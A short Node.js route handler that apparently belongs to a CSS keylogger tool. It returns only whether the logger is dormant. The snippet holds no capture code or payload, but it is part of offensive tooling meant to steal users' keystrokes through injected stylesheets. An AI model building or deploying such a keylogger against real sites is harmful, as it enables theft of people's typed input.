const keyloggerParams = require("./keyloggerParams");

const cssKeyLoggerGetKeysHandler = async (req, res) => {
  res.json({ isDormant: keyloggerParams.isDormant });
};

module.exports = cssKeyLoggerGetKeysHandler;
